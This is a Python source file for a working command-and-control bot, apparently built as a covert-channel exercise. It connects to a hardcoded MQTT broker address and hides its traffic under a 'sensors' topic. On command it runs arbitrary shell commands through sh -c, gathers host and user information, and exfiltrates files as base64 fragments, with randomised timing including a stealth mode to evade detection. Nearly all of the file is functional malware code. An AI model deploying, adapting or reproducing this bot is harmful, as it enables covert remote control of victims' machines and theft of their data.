#!/usr/bin/env python3
"""MQTT C&C Bot - Covert Protocol"""

import argparse
import os
import subprocess
import sys
import time
import random
import re
import base64
import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion
from covert_protocol import (
    parse_time_signal, parse_params_message, create_response_messages,
    cleanup_fragments, is_for_bot, generate_bot_id
)

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"


def compress_output(text):
    text = re.sub(r' +', ' ', text)
    text = re.sub(r'\n+', '\n', text)
    return '\n'.join(line.strip() for line in text.split('\n') if line.strip())


class Bot:
    def __init__(self, bot_id=None, timing=3):
        self.bot_id = bot_id or generate_bot_id()
        self.client = None
        self.running = False
        self.pending_command = None
        self.pending_timestamp = 0
        self.timing = timing
        print(f"[*] Bot ID: {self.bot_id}")
        print(f"[*] Timing: T{self.timing}")

    def connect(self, broker=BROKER, port=PORT, topic=TOPIC):
        self.broker = broker
        self.port = port
        self.topic = topic

        self.client = mqtt.Client(
            callback_api_version=CallbackAPIVersion.VERSION2,
            client_id=f"s{random.randint(10000, 99999)}"
        )
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
        self.client.on_disconnect = self._on_disconnect

        print(f"[*] Connecting to {broker}:{port}")

        try:
            self.client.connect(broker, port, keepalive=60)
            self.running = True
            self.client.loop_forever()
        except KeyboardInterrupt:
            print("\n[*] Stopped")
            self.running = False
            self.client.disconnect()
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)

    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc.is_failure if hasattr(rc, 'is_failure') else rc != 0:
            print(f"[!] Connection failed: {rc}")
        else:
            print(f"[+] Connected, subscribed to {self.topic}")
            client.subscribe(self.topic)

    def _on_disconnect(self, client, userdata, disconnect_flags, rc, properties=None):
        print("[*] Disconnected")
        if self.running:
            time.sleep(5)
            try:
                client.reconnect()
            except:
                pass

    def _on_message(self, client, userdata, msg):
        try:
            payload = msg.payload.decode('utf-8')
        except:
            return

        cleanup_fragments()

        cmd = parse_time_signal(payload)
        if cmd:
            self.pending_command = cmd
            self.pending_timestamp = time.time()
            print(f"[+] Time signal: {cmd}")
            return

        if self.pending_command:
            if time.time() - self.pending_timestamp > 10:
                self.pending_command = None
                return

            parsed = parse_params_message(payload, self.pending_command)
            if parsed:
                target = parsed.get("target", "*")
                params = parsed.get("params", {})

                if is_for_bot(target, self.bot_id):
                    print(f"[+] Command: {self.pending_command} (target={target})")
                    self._handle_command(self.pending_command, params)

                self.pending_command = None

    def _handle_command(self, cmd, params):
        try:
            handlers = {
                "ping": lambda: self._respond("ping", {"s": "ok"}),
                "discover": self._cmd_discover,
                "who": self._cmd_who,
                "user": self._cmd_user,
                "ls": lambda: self._cmd_ls(params),
                "copy": lambda: self._cmd_copy(params),
                "exec": lambda: self._cmd_exec(params),
                "list": lambda: self._cmd_list(params),
            }
            handler = handlers.get(cmd)
            if handler:
                handler()
            else:
                self._respond(cmd, {"error": "unknown"}, False)
        except Exception as e:
            print(f"[!] {e}")
            self._respond(cmd, {"error": str(e)[:50]}, False)

    def _cmd_discover(self):
        h = self._exec(["hostname"]).strip()[:8]
        u = self._exec(["whoami"]).strip()[:6]
        self._respond("discover", {"d": f"{self.bot_id}:{h}:{u}"})

    def _cmd_who(self):
        out = compress_output(self._exec(["w", "-h"]))
        self._respond("who", {"o": out[:100]})

    def _cmd_user(self):
        out = compress_output(self._exec(["id"]))
        self._respond("user", {"o": out[:100]})

    def _cmd_ls(self, params):
        path = params.get("path", ".")
        out = compress_output(self._exec(["ls", "-1", path]))
        self._respond("ls", {"o": out})

    def _cmd_list(self, params):
        path = params.get("path", ".")
        out = self._exec(["ls", "-1", path])
        files = [f.strip() for f in out.strip().split('\n') if f.strip()]
        self._respond("list", {"n": len(files), "o": ','.join(files)})

    def _cmd_copy(self, params):
        path = params.get("path")
        if not path:
            self._respond("copy", {"error": "no path"}, False)
            return
        self._send_file(path)

    def _cmd_exec(self, params):
        cmd = params.get("cmd")
        if not cmd:
            self._respond("exec", {"e": "no cmd"}, False)
            return
        out = compress_output(self._exec(["sh", "-c", cmd]))
        self._respond("exec", {"o": out})

    def _exec(self, cmd):
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.stdout or result.stderr or ""
        except Exception as e:
            return f"error: {e}"

    def _get_delay(self):
        delays = {5: (0, 0.1), 4: (0.2, 0.8), 3: (1.0, 3.0), 2: (3.0, 8.0)}
        if self.timing >= 5:
            return random.uniform(0, 0.1)
        elif self.timing in delays:
            lo, hi = delays[self.timing]
            return random.uniform(lo, hi)
        else:
            return random.uniform(5.0, 20.0) * random.uniform(0.5, 1.5)

    def _respond(self, cmd, result, success=True):
        messages = create_response_messages(cmd, self.bot_id, result, success)

        for i, msg in enumerate(messages):
            delay = self._get_delay()
            if delay > 0.1:
                time.sleep(delay)

            self.client.publish(self.topic, msg)
            self.client.loop_write()

            if self.timing < 5:
                print(f"[+] Fragment {i+1}/{len(messages)} ({len(msg)} chars, {delay:.1f}s)")
            else:
                print(f"[+] Fragment {i+1}/{len(messages)} ({len(msg)} chars)")

        print(f"[+] Response: {cmd} complete ({len(messages)} pkt)")

    def _send_file(self, filepath):
        try:
            if not os.path.isfile(filepath):
                self._respond("copy", {"error": "not found"}, False)
                return

            with open(filepath, 'rb') as f:
                data = f.read()

            filename = os.path.basename(filepath)
            encoded = base64.b64encode(data).decode()

            print(f"[+] Sending {filename} ({len(data)} bytes)")
            self._respond("copy", {"filename": filename, "size": len(data), "data": encoded})
        except Exception as e:
            self._respond("copy", {"error": str(e)[:30]}, False)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--bot-id", "-i", dest="bot_id", help="Bot ID (A####)")
    parser.add_argument("--broker", "-b", type=str, default=BROKER)
    parser.add_argument("--port", "-p", type=int, default=PORT)
    parser.add_argument("--topic", "-t", type=str, default=TOPIC)
    parser.add_argument("-T", type=int, default=3, choices=[1, 2, 3, 4, 5],
                        help="Timing: 1=stealth, 3=normal, 5=instant")
    args = parser.parse_args()

    bot = Bot(args.bot_id, timing=args.T)
    bot.connect(args.broker, args.port, args.topic)


if __name__ == "__main__":
    main()
